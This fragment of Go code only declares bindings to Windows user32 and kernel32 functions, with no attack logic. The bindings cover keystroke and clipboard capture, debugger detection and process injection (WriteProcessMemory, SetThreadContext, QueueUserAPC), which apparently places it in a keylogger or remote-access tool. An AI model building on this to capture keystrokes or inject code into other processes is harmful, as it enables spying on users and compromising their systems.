...
var (
	...
	procGetWindowTextW2            = usr32.MustFindProc("GetWindowTextW")
	procGetForegroundWindow2       = usr32.MustFindProc("GetForegroundWindow")
	procShowWindow2                = usr32.MustFindProc("ShowWindow")
	procEnumWindows2               = usr32.MustFindProc("EnumWindows")
	procMessageBoxW                = usr32.MustFindProc("MessageBoxW")
	procSystemParametersInfoW      = usr32.MustFindProc("SystemParametersInfoW")
	procSendMessageA               = usr32.MustFindProc("SendMessageA")
	procGetKeyboardState           = usr32.MustFindProc("GetKeyboardState")
	procGetKeyboardLayoutList      = usr32.MustFindProc("GetKeyboardLayoutList")
	procMapVirtualKeyEx            = usr32.MustFindProc("MapVirtualKeyExW")
	procGetKeyboardLayout          = usr32.MustFindProc("GetKeyboardLayout")
	procToUnicodeEx                = usr32.MustFindProc("ToUnicodeEx")
	procGetKeyState                = usr32.MustFindProc("GetKeyState")
	procGetAsyncKeyState2          = usr32.MustFindProc("GetAsyncKeyState")
	procIsClipboardFormatAvailable = usr32.MustFindProc("IsClipboardFormatAvailable")
	procOpenClipboard              = usr32.MustFindProc("OpenClipboard")
	procCloseClipboard             = usr32.MustFindProc("CloseClipboard")
	procEmptyClipboard             = usr32.MustFindProc("EmptyClipboard")
	procGetClipboardData           = usr32.MustFindProc("GetClipboardData")
	procSetClipboardData           = usr32.MustFindProc("SetClipboardData")
	procEnumChildWindows           = usr32.MustFindProc("EnumChildWindows")

	krnl32                             = syscall.MustLoadDLL("kernel32.dll")
	ProcIsDebuggerPresent              = krnl32.MustFindProc("IsDebuggerPresent")
	ProcCheckRemoteDebuggerPresent     = krnl32.MustFindProc("CheckRemoteDebuggerPresent")
	ProcGetFileSize                    = krnl32.MustFindProc("GetFileSize")
	ProcIsBadReadPtr                   = krnl32.MustFindProc("IsBadReadPtr")
	ProcVirtualAlloc                   = krnl32.MustFindProc("VirtualAlloc")
	ProcVirtualFree                    = krnl32.MustFindProc("VirtualFree")
	ProcResumeThread                   = krnl32.MustFindProc("ResumeThread")
	ProcVirtualAllocEx                 = krnl32.MustFindProc("VirtualAllocEx")
	ProcWriteProcessMemory             = krnl32.MustFindProc("WriteProcessMemory")
	ProcWow64GetThreadContext          = krnl32.MustFindProc("Wow64GetThreadContext")
	ProcWow64SetThreadContext          = krnl32.MustFindProc("Wow64SetThreadContext")
	ProcGetThreadContext               = krnl32.MustFindProc("GetThreadContext")
	ProcSetThreadContext               = krnl32.MustFindProc("SetThreadContext")
	ProcSetThreadExecutionState        = krnl32.MustFindProc("SetThreadExecutionState")
	ProcGlobalAlloc                    = krnl32.MustFindProc("GlobalAlloc")
	ProcGlobalFree                     = krnl32.MustFindProc("GlobalFree")
	ProcLocalFree                      = krnl32.MustFindProc("LocalFree")
	ProcGlobalLock                     = krnl32.MustFindProc("GlobalLock")
	ProcGlobalUnlock                   = krnl32.MustFindProc("GlobalUnlock")
	ProclstrcpyW                       = krnl32.MustFindProc("lstrcpyW")
	ProcCreateMutex                    = krnl32.MustFindProc("CreateMutexW")
	ProcVirtualProtect                 = krnl32.MustFindProc("VirtualProtect")
	ProcCreateProcessA                 = krnl32.MustFindProc("CreateProcessA")
	ProcReadProcessMemory              = krnl32.MustFindProc("ReadProcessMemory")
	ProcGetModuleFileNameA             = krnl32.MustFindProc("GetModuleFileNameA")
	ProcWow64DisableWow64FsRedirection = krnl32.MustFindProc("Wow64DisableWow64FsRedirection")
	ProcWow64RevertWow64FsRedirection  = krnl32.MustFindProc("Wow64RevertWow64FsRedirection")
	ProcVirtualProtectEx               = krnl32.MustFindProc("VirtualProtectEx")
	ProcQueueUserAPC                   = krnl32.MustFindProc("QueueUserAPC")
